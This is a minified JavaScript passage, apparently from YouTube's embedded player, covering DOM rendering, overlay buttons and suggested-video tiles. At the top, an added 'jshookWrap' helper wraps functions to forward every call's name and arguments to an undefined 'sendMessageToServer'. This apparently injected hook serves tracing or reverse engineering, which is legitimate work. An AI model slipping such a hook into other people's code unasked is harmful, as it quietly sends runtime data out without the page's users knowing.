(function (g) {
  function jshookWrap(func, name) {
    return function () {
      sendMessageToServer(`Function ${name} called with arguments ${JSON.stringify(arguments)}`);
      return func.apply(this, arguments);
    };
  }
  var window = this; /*
                     Copyright 2017 Google LLC
                     SPDX-License-Identifier: BSD-3-Clause
                     */
  /*
   SPDX-License-Identifier: Apache-2.0 */
  'use strict';
  var flb = function (a) {
      a.mutedAutoplay = !1;
      a.endSeconds = NaN;
      a.limitedPlaybackDurationInSeconds = NaN;
      g.iN(a);
    },
    glb = function () {
      return {
        I: "svg",
        Y: {
          height: "100%",
          version: "1.1",
          viewBox: "0 0 110 26",
          width: "100%"
        },
        X: [{
          I: "path",
          wc: !0,
          T: "ytp-svg-fill",
          Y: {
            d: "M 16.68,.99 C 13.55,1.03 7.02,1.16 4.99,1.68 c -1.49,.4 -2.59,1.6 -2.99,3 -0.69,2.7 -0.68,8.31 -0.68,8.31 0,0 -0.01,5.61 .68,8.31 .39,1.5 1.59,2.6 2.99,3 2.69,.7 13.40,.68 13.40,.68 0,0 10.70,.01 13.40,-0.68 1.5,-0.4 2.59,-1.6 2.99,-3 .69,-2.7 .68,-8.31 .68,-8.31 0,0 .11,-5.61 -0.68,-8.31 -0.4,-1.5 -1.59,-2.6 -2.99,-3 C 29.11,.98 18.40,.99 18.40,.99 c 0,0 -0.67,-0.01 -1.71,0 z m 72.21,.90 0,21.28 2.78,0 .31,-1.37 .09,0 c .3,.5 .71,.88 1.21,1.18 .5,.3 1.08,.40 1.68,.40 1.1,0 1.99,-0.49 2.49,-1.59 .5,-1.1 .81,-2.70 .81,-4.90 l 0,-2.40 c 0,-1.6 -0.11,-2.90 -0.31,-3.90 -0.2,-0.89 -0.5,-1.59 -1,-2.09 -0.5,-0.4 -1.10,-0.59 -1.90,-0.59 -0.59,0 -1.18,.19 -1.68,.49 -0.49,.3 -1.01,.80 -1.21,1.40 l 0,-7.90 -3.28,0 z m -49.99,.78 3.90,13.90 .18,6.71 3.31,0 0,-6.71 3.87,-13.90 -3.37,0 -1.40,6.31 c -0.4,1.89 -0.71,3.19 -0.81,3.99 l -0.09,0 c -0.2,-1.1 -0.51,-2.4 -0.81,-3.99 l -1.37,-6.31 -3.40,0 z m 29.59,0 0,2.71 3.40,0 0,17.90 3.28,0 0,-17.90 3.40,0 c 0,0 .00,-2.71 -0.09,-2.71 l -9.99,0 z m -53.49,5.12 8.90,5.18 -8.90,5.09 0,-10.28 z m 89.40,.09 c -1.7,0 -2.89,.59 -3.59,1.59 -0.69,.99 -0.99,2.60 -0.99,4.90 l 0,2.59 c 0,2.2 .30,3.90 .99,4.90 .7,1.1 1.8,1.59 3.5,1.59 1.4,0 2.38,-0.3 3.18,-1 .7,-0.7 1.09,-1.69 1.09,-3.09 l 0,-0.5 -2.90,-0.21 c 0,1 -0.08,1.6 -0.28,2 -0.1,.4 -0.5,.62 -1,.62 -0.3,0 -0.61,-0.11 -0.81,-0.31 -0.2,-0.3 -0.30,-0.59 -0.40,-1.09 -0.1,-0.5 -0.09,-1.21 -0.09,-2.21 l 0,-0.78 5.71,-0.09 0,-2.62 c 0,-1.6 -0.10,-2.78 -0.40,-3.68 -0.2,-0.89 -0.71,-1.59 -1.31,-1.99 -0.7,-0.4 -1.48,-0.59 -2.68,-0.59 z m -50.49,.09 c -1.09,0 -2.01,.18 -2.71,.68 -0.7,.4 -1.2,1.12 -1.49,2.12 -0.3,1 -0.5,2.27 -0.5,3.87 l 0,2.21 c 0,1.5 .10,2.78 .40,3.78 .2,.9 .70,1.62 1.40,2.12 .69,.5 1.71,.68 2.81,.78 1.19,0 2.08,-0.28 2.78,-0.68 .69,-0.4 1.09,-1.09 1.49,-2.09 .39,-1 .49,-2.30 .49,-3.90 l 0,-2.21 c 0,-1.6 -0.2,-2.87 -0.49,-3.87 -0.3,-0.89 -0.8,-1.62 -1.49,-2.12 -0.7,-0.5 -1.58,-0.68 -2.68,-0.68 z m 12.18,.09 0,11.90 c -0.1,.3 -0.29,.48 -0.59,.68 -0.2,.2 -0.51,.31 -0.81,.31 -0.3,0 -0.58,-0.10 -0.68,-0.40 -0.1,-0.3 -0.18,-0.70 -0.18,-1.40 l 0,-10.99 -3.40,0 0,11.21 c 0,1.4 .18,2.39 .68,3.09 .49,.7 1.21,1 2.21,1 1.4,0 2.48,-0.69 3.18,-2.09 l .09,0 .31,1.78 2.59,0 0,-14.99 c 0,0 -3.40,.00 -3.40,-0.09 z m 17.31,0 0,11.90 c -0.1,.3 -0.29,.48 -0.59,.68 -0.2,.2 -0.51,.31 -0.81,.31 -0.3,0 -0.58,-0.10 -0.68,-0.40 -0.1,-0.3 -0.21,-0.70 -0.21,-1.40 l 0,-10.99 -3.40,0 0,11.21 c 0,1.4 .21,2.39 .71,3.09 .5,.7 1.18,1 2.18,1 1.39,0 2.51,-0.69 3.21,-2.09 l .09,0 .28,1.78 2.62,0 0,-14.99 c 0,0 -3.40,.00 -3.40,-0.09 z m 20.90,2.09 c .4,0 .58,.11 .78,.31 .2,.3 .30,.59 .40,1.09 .1,.5 .09,1.21 .09,2.21 l 0,1.09 -2.5,0 0,-1.09 c 0,-1 -0.00,-1.71 .09,-2.21 0,-0.4 .11,-0.8 .31,-1 .2,-0.3 .51,-0.40 .81,-0.40 z m -50.49,.12 c .5,0 .8,.18 1,.68 .19,.5 .28,1.30 .28,2.40 l 0,4.68 c 0,1.1 -0.08,1.90 -0.28,2.40 -0.2,.5 -0.5,.68 -1,.68 -0.5,0 -0.79,-0.18 -0.99,-0.68 -0.2,-0.5 -0.31,-1.30 -0.31,-2.40 l 0,-4.68 c 0,-1.1 .11,-1.90 .31,-2.40 .2,-0.5 .49,-0.68 .99,-0.68 z m 39.68,.09 c .3,0 .61,.10 .81,.40 .2,.3 .27,.67 .37,1.37 .1,.6 .12,1.51 .12,2.71 l .09,1.90 c 0,1.1 .00,1.99 -0.09,2.59 -0.1,.6 -0.19,1.08 -0.49,1.28 -0.2,.3 -0.50,.40 -0.90,.40 -0.3,0 -0.51,-0.08 -0.81,-0.18 -0.2,-0.1 -0.39,-0.29 -0.59,-0.59 l 0,-8.5 c .1,-0.4 .29,-0.7 .59,-1 .3,-0.3 .60,-0.40 .90,-0.40 z"
          }
        }]
      };
    },
    hlb = function (a, b) {
      if (a.Fm && a.Wr) {
        var c = a.Fm[b];
        a = a.Wr[b];
        c.FI && c.eE && (b = c.FI.length - 1, B5(c.FI, a, b), B5(c.eE, a, b), c.FI.pop(), c.eE.pop(), b = c.FI[a], null != b && b.Wr && (b.Wr[c.eE[a]] = a));
      }
    },
    ilb = function (a, b) {
      if (a.Fm && a.Wr) {
        B5(a.Fm, b, a.Fm.length - 1);
        B5(a.Wr, b, a.Wr.length - 1);
        a.Fm.pop();
        a.Wr.pop();
        var c = a.Fm[b];
        a = a.Wr[b];
        if (null == c ? 0 : c.eE) c.eE[a] = b;
      }
    },
    B5 = function (a, b, c) {
      -1 === c && (c = a.length - 1);
      var d = a[b];
      a[b] = a[c];
      a[c] = d;
    },
    jlb = function (a) {
      if (0 !== a.state && !a.isDisposed) {
        if (1 === a.state && a.Fm) for (var b = g.v(a.Fm), c = b.next(); !c.done; c = b.next()) c = c.value, null != c.UA && jlb(c);
        2 === a.state && null != a.UA && a.UA(a);
        a.state = 0;
      }
    },
    klb = function (a, b) {
      a = void 0 === a ? C5 : a;
      var c = C5;
      C5 = a;
      try {
        return b(void 0);
      } finally {
        C5 = c;
      }
    },
    olb = function (a, b) {
      llb(function () {
        a.T$ = 0;
        if (a.yA) for (var c = g.v(a.yA), d = c.next(); !d.done; d = c.next()) mlb(d.value);
        nlb(a);
        c = klb(a, b);
        if (a.Fm && a.Wr) for (d = a.T$; d < a.Fm.length; d++) {
          var e = a,
            f = d;
          hlb(e, f);
          ilb(e, f);
        }
        return c;
      });
    },
    llb = function (a) {
      if (null != D5) a();else {
        D5 = [];
        try {
          a();
          for (var b = g.v(D5), c = b.next(); !c.done; c = b.next()) jlb(c.value);
        } finally {
          D5 = null;
        }
      }
    },
    plb = function (a) {
      olb(a, a.fn);
    },
    mlb = function (a) {
      a.isDisposed = !0;
      if (a.yA) for (var b = g.v(a.yA), c = b.next(); !c.done; c = b.next()) mlb(c.value);
      if (null != a.UA && a.Fm) for (b = 0; b < a.Fm.length; b++) {
        c = a;
        var d = b;
        hlb(c, d);
        ilb(c, d);
      }
      nlb(a);
    },
    nlb = function (a) {
      if (a.bV) {
        for (var b = g.v(a.bV), c = b.next(); !c.done; c = b.next()) c = c.value, c();
        a.bV.length = 0;
      }
    },
    qlb = function (a) {
      function b() {
        return a(function () {
          return void mlb(c);
        }, c);
      }
      var c = {};
      llb(function () {
        return klb(c, b);
      });
    },
    rlb = function (a) {
      var b = {
        value: null
      };
      if (C5) {
        var c;
        (c = C5).yA || (c.yA = []);
        C5.yA.push(b);
      }
      b.fn = a;
      b.UA = plb;
      b.lfb = !0;
      b.state = 2;
      jlb(b);
    },
    slb = function (a) {
      var b = {},
        c;
      for (c in a) b = {
        mQ: b.mQ,
        eP: b.eP
      }, b.mQ = E5[c], b.eP = a[c], E5[c] = function (d) {
        return function () {
          var e = g.Ia.apply(0, arguments);
          d.mQ.apply(null, g.pa(e));
          d.eP.apply(null, g.pa(e));
        };
      }(b);
    },
    F5 = function (a) {
      this.props = a;
      this.rU = !1;
    },
    tlb = function () {},
    G5 = function (a, b) {
      for (; a.length > b;) a.pop();
    },
    ulb = function (a) {
      a = Array(a);
      G5(a, 0);
      return a;
    },
    vlb = function (a, b, c) {
      if (null == c) a.removeAttribute(b);else {
        var d = 0 === b.lastIndexOf("xml:", 0) ? "http://www.w3.org/XML/1998/namespace" : 0 === b.lastIndexOf("xlink:", 0) ? "http://www.w3.org/1999/xlink" : null;
        d ? a.setAttributeNS(d, b, c) : a.setAttribute(b, c);
      }
    },
    xlb = function (a, b, c) {
      a = a.style;
      if ("string" === typeof c) a.cssText = c;else {
        a.cssText = "";
        for (var d in c) wlb.call(c, d) && (b = c[d], 0 <= d.indexOf("-") ? a.setProperty(d, b) : a[d] = b);
      }
    },
    ylb = function (a, b, c) {
      var d = typeof c;
      "object" === d || "function" === d ? a[b] = c : vlb(a, b, c);
    },
    H5 = function () {
      var a = new tlb();
      a.__default = ylb;
      a.style = xlb;
      return a;
    },
    zlb = function (a, b, c, d) {
      (d[b] || d.__default)(a, b, c);
    },
    Alb = function (a) {
      this.created = [];
      this.j = [];
      this.node = a;
    },
    Blb = function (a, b) {
      this.j = null;
      this.B = a;
      this.key = b;
      this.text = void 0;
    },
    I5 = function (a, b, c) {
      b = new Blb(b, c);
      return a.__incrementalDOMData = b;
    },
    J5 = function (a, b) {
      if (a.__incrementalDOMData) return a.__incrementalDOMData;
      var c = 1 === a.nodeType ? a.localName : a.nodeName,
        d = 1 === a.nodeType ? a.getAttribute("key") : null;
      b = I5(a, c, 1 === a.nodeType ? d || b : null);
      if (1 === a.nodeType && (a = a.attributes, c = a.length)) {
        d = b.j || (b.j = ulb(2 * c));
        for (var e = 0, f = 0; e < c; e += 1, f += 2) {
          var h = a[e],
            l = h.value;
          d[f] = h.name;
          d[f + 1] = l;
        }
      }
      return b;
    },
    Clb = function (a, b, c, d, e) {
      return b == c && d == e;
    },
    N5 = function (a) {
      for (var b = K5, c = L5(); c !== a;) {
        var d = c.nextSibling;
        b.removeChild(c);
        M5.j.push(c);
        c = d;
      }
    },
    L5 = function () {
      return O5 ? O5.nextSibling : K5.firstChild;
    },
    Dlb = function (a, b) {
      O5 = L5();
      if (P5 && O5) I5(O5, a, b);else {
        var c;
        a: {
          if (c = O5) {
            do {
              var d = c,
                e = a,
                f = b,
                h = J5(d, f);
              if (Q5(d, e, h.B, f, h.key)) break a;
            } while (b && (c = c.nextSibling));
          }
          c = null;
        }
        c || ("#text" === a ? (a = R5.createTextNode(""), I5(a, "#text", null)) : (c = R5, d = K5, "function" === typeof a ? c = new a() : c = (d = "svg" === a ? "http://www.w3.org/2000/svg" : "math" === a ? "http://www.w3.org/1998/Math/MathML" : null == d || "foreignObject" === J5(d).B ? null : d.namespaceURI) ? c.createElementNS(d, a) : c.createElement(a), I5(c, a, b), a = c), M5.created.push(a), c = a);
        a = c;
        if (a !== O5) {
          if (0 <= S5.indexOf(a)) for (b = K5, c = a.nextSibling, d = O5; null !== d && d !== a;) e = d.nextSibling, b.insertBefore(d, c), d = e;else K5.insertBefore(a, O5);
          O5 = a;
        }
      }
    },
    Elb = function (a, b) {
      Dlb(a, b);
      K5 = O5;
      O5 = null;
      return K5;
    },
    Glb = function (a, b) {
      b = void 0 === b ? {} : b;
      var c = void 0 === b.matches ? Clb : b.matches,
        d = void 0 === b.F6 ? !1 : b.F6;
      return function (e, f, h) {
        var l = M5,
          m = R5,
          n = S5,
          p = T5,
          q = O5,
          t = K5,
          u = Q5,
          y = P5;
        R5 = e.ownerDocument;
        M5 = new Alb(e);
        Q5 = c;
        T5 = [];
        O5 = null;
        var A = K5 = e.parentNode,
          E,
          L = Flb.call(e);
        if ((E = 11 === L.nodeType || 9 === L.nodeType ? L.activeElement : null) && e.contains(E)) {
          for (L = []; E !== A;) L.push(E), E = E.parentNode || (A ? E.host : null);
          A = L;
        } else A = [];
        S5 = A;
        P5 = d;
        try {
          return a(e, f, h);
        } finally {
          e = M5, U5 && 0 < e.j.length && U5(e.j), R5 = m, M5 = l, Q5 = u, T5 = p, O5 = q, K5 = t, S5 = n, P5 = y;
        }
      };
    },
    Hlb = function (a, b, c, d) {
      V5.push(zlb);
      V5.push(a);
      V5.push(b);
      V5.push(c);
      V5.push(d);
    },
    Ilb = function (a) {
      Dlb("#text", null);
      var b = O5;
      var c = J5(b);
      if (c.text !== a) {
        c = c.text = a;
        for (var d = 1; d < arguments.length; d += 1) c = (0, arguments[d])(c);
        b.data !== c && (b.data = c);
      }
    },
    Jlb = function (a) {
      for (var b in a) W5.attributes[b] = a[b](W5.attributes[b]);
    },
    Llb = function (a) {
      Klb.push(a);
      a.attributes && Jlb(a.attributes);
      a.vZ && slb(a.vZ);
    },
    Mlb = function () {
      F5.apply(this, arguments);
      this.yD = [];
      this.D = 0;
    },
    Nlb = function (a) {
      var b = null,
        c = null,
        d = {
          value: null,
          HY: function (e) {
            if (b !== e) {
              e.__ref = d;
              b && (b.__ref = void 0);
              b = e;
              var f;
              null == (f = c) || f();
              c = a(e) || null;
            }
          },
          OY: function () {
            b && (b.__ref = void 0, b = null);
            var e;
            null == (e = c) || e();
          }
        };
      return d;
    },
    Olb = function (a) {
      return a.children;
    },
    Plb = function (a) {
      var b;
      return void 0 !== (null == (b = a.prototype) ? void 0 : b.NA);
    },
    Slb = function (a, b, c) {
      if (Object.hasOwnProperty.call(Qlb, a) && (a = Qlb[a], Object.hasOwnProperty.call(a, b) && (a = a[b], a instanceof Array))) {
        for (var d = null, e = !1, f = 0, h = a.length; f < h; ++f) {
          var l = a[f],
            m = l.di;
          if (!m) return l.Ed;
          null === d && (d = {});
          m = Object.hasOwnProperty.call(d, m) ? d[m] : d[m] = c(m);
          if (m === l.Hi) return l.Ed;
          null == m && (e = !0);
        }
        if (e) return null;
      }
      b = Rlb[b];
      return "number" === typeof b ? b : null;
    },
    X5 = function () {
      this.cX = "";
    },
    Ulb = function (a, b, c) {
      if (null === c || void 0 === c) return c;
      var d = Slb(a.tagName.toLowerCase(), b, function () {
        throw Error("Contingent attribute/property lookups are not supported.");
      });
      if (null === d) return c;
      d = Tlb[d];
      var e;
      if (null == (e = d.Qt) ? 0 : e.call(d, c)) {
        if (d.xs) return d.xs(c);
        throw Error("Value Handler's unwrap function does not exist.");
      }
      c = c && c.Cn ? c.Pk() : c;
      return d.Aq ? d.Aq(a.tagName, b, String(c)) : c;
    },
    Wlb = function (a, b) {
      var c = Vlb;
      qlb(function (d) {
        a.jG = d;
        rlb(function () {
          for (var e = a.kG, f = [], h = 0; h < e.length; h++) {
            var l = e[h],
              m = b[l]();
            f[h] !== m && (f[h] = m, c(a, l, m));
          }
        });
      });
    },
    Xlb = function (a) {
      var b = document.createTextNode("");
      qlb(function (c) {
        b.a4 = !0;
        b.jG = c;
        rlb(function () {
          var d = a();
          null == d && (d = "");
          var e = typeof d;
          if ("object" === e || "function" === e) throw Error("Invalid text node kind: " + e + ". Text nodes must be primitives like numbers, strings, or null, but an object type was passed");
          b.textContent = String(d);
        });
      });
      return b;
    },
    $lb = function (a, b, c) {
      c = ((void 0 === c ? 0 : c) ? Ylb : Zlb)(a, function () {
        Y5(b);
      });
      null != c || (c = a);
    },
    Y5 = function (a) {
      if (void 0 !== a && null !== a) if (Array.isArray(a)) {
        a = g.v(a);
        for (var b = a.next(); !b.done; b = a.next()) Y5(b.value);
      } else if (a instanceof g.Td || a instanceof g.Yd || a instanceof g.be) Ilb(a.toString());else {
        if (a instanceof Node) throw Error("Encountered a real dom node where a vdom node was expected. Real dom nodes should only come from the reactive renderer, and they can't be passed in JSX expressions directly. Tag name: " + a.tagName);
        var c = typeof a;
        if ("boolean" === c || "number" === c || "string" === c) Ilb(a);else {
          if ("string" === typeof a.type) {
            a.lq || Elb(a.type, a.props.idomKey);
            c = K5;
            for (var d in a.props) if (a.props[d] !== amb) {
              var e = a.props[d],
                f = T5;
              f.push(d);
              f.push(e);
            }
            d = W5.attributes;
            d = void 0 === d ? bmb : d;
            e = K5;
            var h = J5(e);
            f = d;
            d = T5;
            h = h.j || (h.j = ulb(d.length));
            for (var l = !h.length || !1, m = 0; m < d.length; m += 2) {
              var n = d[m];
              if (l) h[m] = n;else if (h[m] !== n) break;
              var p = d[m + 1];
              if (l || h[m + 1] !== p) h[m + 1] = p, Hlb(e, n, p, f);
            }
            if (m < d.length || m < h.length) {
              for (m = l = m; m < h.length; m += 2) Z5[h[m]] = h[m + 1];
              for (m = l; m < d.length; m += 2) l = d[m], n = d[m + 1], Z5[l] !== n && Hlb(e, l, n, f), h[m] = l, h[m + 1] = n, delete Z5[l];
              G5(h, d.length);
              for (var q in Z5) Hlb(e, q, void 0, f), delete Z5[q];
            }
            q = cmb;
            cmb = e = V5.length;
            for (f = q; f < e; f += 5) (0, V5[f])(V5[f + 1], V5[f + 2], V5[f + 3], V5[f + 4]);
            cmb = q;
            G5(V5, q);
            G5(d, 0);
            null == c.jG && null != c.kG && Wlb(c, a.props);
            (a.props.skip || a.props.skipchildren) && K5.hasChildNodes() ? O5 = K5.lastChild : Y5(a.children);
            N5(null);
            O5 = K5;
            K5 = K5.parentNode;
            a.lq && (a.lq = !1);
            if (a.props.el) {
              a = a.props.el;
              if (a.ydb) throw Error(dmb);
              null == (b = a.HY) || b.call(a, c);
            }
            return c;
          }
          a.type === Olb ? Y5(a.children) : "function" === typeof a ? (b = K5, (c = L5()) && c.a4 || b.insertBefore(Xlb(a), c), O5 = L5()) : W5.wZ(a);
        }
      }
    },
    Vlb = function (a, b, c) {
      !1 === c && emb.has(b) ? vlb(a, b, null) : "el" !== b && "idomKey" !== b && "skip" !== b && "skipchildren" !== b && "children" !== b && "el" !== b && (b.startsWith("on") ? ":" === b[2] ? (c = c.Eeb(0), a["on" + b.slice(3)] = c) : fmb(a, b, c) : "function" !== typeof c || null != a.jG ? (W5.l5 && (c = Ulb(a, b, c)), "style" === b ? gmb(a, b, c) : b.startsWith("prop:") ? a[b.slice(5)] = c : fmb(a, b, c)) : (a.kG || (a.kG = []), a.kG.push(b)));
    },
    hmb = function (a) {
      E5.JU(a);
      var b = a.NA(a.props);
      if (b) return a.props.idomKey && (b.props.idomKey = a.props.idomKey), b;
    },
    imb = function (a, b) {
      try {
        b();
      } catch (d) {
        b = d;
        var c;
        null == (c = W5.NH) || c.call(W5, a, b);
      }
    },
    jmb = function (a, b) {
      Plb(a) ? b = new a(b) : (b = new Mlb(b), b.G = a);
      b.B = a;
      b.j = {
        fP: b.state,
        iX: !1
      };
      return b;
    },
    kmb = function (a) {
      for (var b = 0; b < a.length; b++) {
        var c = void 0,
          d = void 0,
          e = void 0,
          f = void 0,
          h = void 0,
          l = void 0,
          m = void 0,
          n = a[b];
        if (n) {
          null == (m = n.__ref) || null == (l = m.OY) || l.call(m);
          null == (h = n.jG) || h.call(n);
          if (n.__instance) {
            h = n.__instance;
            try {
              h.UG();
            } catch (p) {
              null == (e = W5.NH) || e.call(W5, null == (f = h.B) ? void 0 : f.yL, p);
            }
            E5.UG(h);
            null == (d = h.C) || null == (c = d.OY) || c.call(d);
            h.el = null;
            delete n.__instance;
          }
          kmb(n.childNodes);
        }
      }
    },
    mmb = function (a) {
      1 === lmb.push(a) && requestAnimationFrame(function () {
        setTimeout(function () {
          var b = [].concat(g.pa(lmb));
          lmb = [];
          b = g.v(b);
          for (var c = b.next(); !c.done; c = b.next()) {
            c = c.value;
            try {
              kmb(c);
            } catch (e) {
              var d = c = void 0;
              null == (d = (c = W5).NH) || d.call(c, "unknown", e);
            }
          }
        });
      });
    },
    $5 = function (a, b) {
      return nmb.apply(null, [a, b].concat(g.pa(g.Ia.apply(2, arguments))));
    },
    nmb = function (a, b) {
      var c = g.Ia.apply(2, arguments),
        d;
      b = null != (d = b) ? d : {};
      return {
        type: a,
        props: b,
        children: c
      };
    },
    qmb = function (a) {
      var b = a6;
      if (null == b) throw Error(omb);
      var c = b.D++;
      b.yD || (b.yD = []);
      var d = b.yD;
      d[c] || (d[c] = {
        key: a,
        host: b
      });
      if (a !== d[c].key) throw Error(pmb);
      return d[c];
    },
    rmb = function (a, b) {
      return !a || a.length !== (null == b ? void 0 : b.length) || a.some(function (c, d) {
        return c !== b[d];
      });
    },
    tmb = function (a, b) {
      smb(a, b);
    },
    smb = function (a, b) {
      var c = 0;
      c = void 0 === c ? 0 : c;
      var d = qmb("setLifecycle"),
        e = a6;
      1 === c && e.rU && (c = 0);
      rmb(d.rf, b) && (d.rf = b, d.WY = a, 0 === c && (e.zy || (e.zy = []), e.zy.push(d)), 1 === c && (e.iG || (e.iG = []), e.iG.push(d)));
    },
    vmb = function (a) {
      var b = [].concat(g.pa(a));
      a.length = 0;
      a = g.v(b);
      for (b = a.next(); !b.done; b = a.next()) {
        b = b.value;
        umb(b);
        var c = b.WY;
        b.WY = null;
        if (c = null == c ? void 0 : c()) b.VY = c;
      }
    },
    umb = function (a) {
      var b = a.VY;
      a.VY = null;
      null == b || b();
    },
    wmb = function (a) {
      var b = [],
        c = qmb("useMemoInternal");
      rmb(c.rf, b) && (c.rf = b, c.value = a());
      return c.value;
    },
    xmb = function () {
      var a = wmb(function () {
        return Nlb(function (b) {
          a.value = b;
          return function () {
            a.value = null;
          };
        });
      });
      return a;
    },
    ymb = function (a) {
      var b = a6,
        c = wmb(function () {
          return {
            value: "function" === typeof a ? a() : a
          };
        });
      return [c.value, function (d) {
        if (null !== a6) throw Error("Can't set state during rendering");
        c.value = "function" === typeof d ? d(c.value) : d;
        b.j = {
          fP: b.state,
          iX: !0
        };
        if (b.el) {
          var e;
          d = {
            props: b.props,
            type: b.B,
            children: null != (e = b.props.children) ? e : []
          };
          try {
            $lb(b.el, d, !0);
          } catch (l) {
            var f, h;
            null == (h = W5.NH) || h.call(W5, null == (f = b.B) ? void 0 : f.yL, l);
          }
        }
      }];
    },
    zmb = function (a) {
      function b() {
        var l = g.$R(a.J) ? "Hide more shorts" : "Hide more videos";
        e(l);
      }
      var c = g.v(ymb("Hide more videos")),
        d = c.next().value,
        e = c.next().value;
      tmb(function () {
        var l = a.J;
        l.addEventListener("videodatachange", b);
        return function () {
          l.removeEventListener("videodatachange", b);
        };
      }, [a.J]);
      var f = wmb(function () {
          return new g.$P(g.kQ()).element;
        }),
        h = xmb();
      smb(function () {
        h.value.appendChild(f);
      }, []);
      return $5("button", {
        class: "ytp-button ytp-collapse",
        "aria-label": d
      }, $5("div", {
        class: "ytp-collapse-icon",
        el: h,
        skip: !0
      }));
    },
    Amb = function (a) {
      function b() {
        var f = g.$R(a.J) ? "More shorts" : "More videos";
        e(f);
      }
      var c = g.v(ymb("More videos")),
        d = c.next().value,
        e = c.next().value;
      tmb(function () {
        var f = a.J;
        f.addEventListener("videodatachange", b);
        return function () {
          f.removeEventListener("videodatachange", b);
        };
      }, [a.J]);
      return $5("button", {
        class: "ytp-button ytp-expand"
      }, d);
    },
    Bmb = function (a) {
      function b(f) {
        f = f.state;
        a: {
          var h = g.v([1, 16, 32]);
          for (var l = h.next(); !l.done; l = h.next()) if (g.AO(f, l.value)) {
            h = !0;
            break a;
          }
          h = !1;
        }
        h || ((f = g.AO(f, 4) && !g.AO(f, 2) && !g.AO(f, 1024)) && g.nr(a.J.getRootNode(), "ytp-expand-pause-overlay"), e(f));
      }
      var c = g.v(ymb(!1)),
        d = c.next().value,
        e = c.next().value;
      tmb(function () {
        var f = a.J;
        f.addEventListener("presentingplayerstatechange", b);
        return function () {
          f.removeEventListener("presentingplayerstatechange", b);
        };
      }, [a.J]);
      return $5("ytp-pause-overlay", {
        class: "ytp-pause-overlay",
        "aria-hidden": !d
      }, $5(zmb, {
        J: a.J,
        wb: a.wb
      }), $5(Amb, {
        J: a.J,
        wb: a.wb
      }));
    },
    Cmb = function (a) {
      g.X.call(this, {
        I: "div",
        T: "ytp-related-on-error-overlay"
      });
      var b = this;
      this.api = a;
      this.K = this.B = 0;
      this.G = new g.tJ(this);
      this.j = [];
      this.suggestionData = [];
      this.columns = this.containerWidth = 0;
      this.title = new g.X({
        I: "h2",
        T: "ytp-related-title",
        Aa: "{{title}}"
      });
      this.previous = new g.X({
        I: "button",
        Na: ["ytp-button", "ytp-previous"],
        Y: {
          "aria-label": "Show previous suggested videos"
        },
        X: [g.gQ()]
      });
      this.va = new g.E2(function (f) {
        b.suggestions.element.scrollLeft = -f;
      });
      this.D = this.C = 0;
      this.S = !0;
      this.next = new g.X({
        I: "button",
        Na: ["ytp-button", "ytp-next"],
        Y: {
          "aria-label": "Show more suggested videos"
        },
        X: [g.hQ()]
      });
      g.H(this, this.G);
      a = a.W();
      this.ea = a.D;
      g.H(this, this.title);
      this.title.Ha(this.element);
      this.suggestions = new g.X({
        I: "div",
        T: "ytp-suggestions"
      });
      g.H(this, this.suggestions);
      this.suggestions.Ha(this.element);
      g.H(this, this.previous);
      this.previous.Ha(this.element);
      this.previous.Ua("click", this.o1, this);
      g.H(this, this.va);
      for (var c = {
        Iz: 0
      }; 16 > c.Iz; c = {
        Iz: c.Iz
      }, c.Iz++) {
        var d = new g.X({
          I: "a",
          T: "ytp-suggestion-link",
          Y: {
            href: "{{link}}",
            target: a.ea,
            "aria-label": "{{aria_label}}"
          },
          X: [{
            I: "div",
            T: "ytp-suggestion-image",
            X: [{
              I: "div",
              Y: {
                "data-is-live": "{{is_live}}"
              },
              T: "ytp-suggestion-duration",
              Aa: "{{duration}}"
            }]
          }, {
            I: "div",
            T: "ytp-suggestion-title",
            Y: {
              title: "{{hover_title}}"
            },
            Aa: "{{title}}"
          }, {
            I: "div",
            T: "ytp-suggestion-author",
            Aa: "{{views_or_author}}"
          }]
        });
        g.H(this, d);
        d.Ha(this.suggestions.element);
        var e = d.Ia("ytp-suggestion-link");
        g.zo(e, "transitionDelay", c.Iz / 20 + "s");
        this.G.V(e, "click", function (f) {
          return function (h) {
            var l = f.Iz,
              m = b.suggestionData[l],
              n = m.sessionData;
            g.wL(b.api.W()) && b.api.N("web_player_log_click_before_generating_ve_conversion_params") ? (b.api.ub(b.j[l].element), l = m.Rk(), m = {}, g.$Ma(b.api, m, "emb_rel_err"), l = g.dk(l, m), g.vS(l, b.api, h)) : g.uS(h, b.api, b.ea, n || void 0) && b.api.Go(m.videoId, n, m.playlistId);
          };
        }(c));
        this.j.push(d);
      }
      g.H(this, this.next);
      this.next.Ha(this.element);
      this.next.Ua("click", this.n1, this);
      this.G.V(this.api, "videodatachange", this.onVideoDataChange);
      this.resize(this.api.sb().getPlayerSize());
      this.onVideoDataChange();
      this.show();
    },
    Dmb = function (a, b) {
      if (a.api.W().N("web_player_log_click_before_generating_ve_conversion_params")) for (var c = Math.floor(-a.C / (a.D + a.B)), d = Math.min(c + a.columns, a.suggestionData.length) - 1; c <= d; c++) a.api.Ya(a.j[c].element, b);
    },
    Emb = function (a) {
      a.next.element.style.bottom = a.K + "px";
      a.previous.element.style.bottom = a.K + "px";
      var b = a.C,
        c = a.containerWidth - a.suggestionData.length * (a.D + a.B);
      g.rr(a.element, "ytp-scroll-min", 0 <= b);
      g.rr(a.element, "ytp-scroll-max", b <= c);
    },
    Fmb = function (a) {
      for (var b = 0; b < a.suggestionData.length; b++) {
        var c = a.suggestionData[b],
          d = a.j[b],
          e = c.shortViewCount ? c.shortViewCount : c.author,
          f = c.Rk(),
          h = a.api.W();
        if (g.wL(h) && !h.N("web_player_log_click_before_generating_ve_conversion_params")) {
          var l = {};
          g.JR(a.api, "addEmbedsConversionTrackingParams", [l]);
          f = g.dk(f, g.CR(l, "emb_rel_err"));
        }
        d.element.style.display = "";
        l = d.Ia("ytp-suggestion-title");
        g.Cr.test(c.title) ? l.dir = "rtl" : g.Mdb.test(c.title) && (l.dir = "ltr");
        l = d.Ia("ytp-suggestion-author");
        g.Cr.test(e) ? l.dir = "rtl" : g.Mdb.test(e) && (l.dir = "ltr");
        d.update({
          views_or_author: e,
          duration: c.isLivePlayback ? "Live" : c.lengthSeconds ? g.MQ(c.lengthSeconds) : "",
          link: f,
          hover_title: c.title,
          title: c.title,
          aria_label: c.ariaLabel || null,
          is_live: c.isLivePlayback
        });
        e = d.Ia("ytp-suggestion-image");
        f = c.Jg();
        e.style.backgroundImage = f ? "url(" + f + ")" : "";
        h.N("web_player_log_click_before_generating_ve_conversion_params") && (a.api.ag(d.element, d), (c = (c = c.sessionData) && c.itct) && a.api.fg(d.element, c));
      }
      for (; b < a.j.length; b++) a.j[b].element.style.display = "none";
      Emb(a);
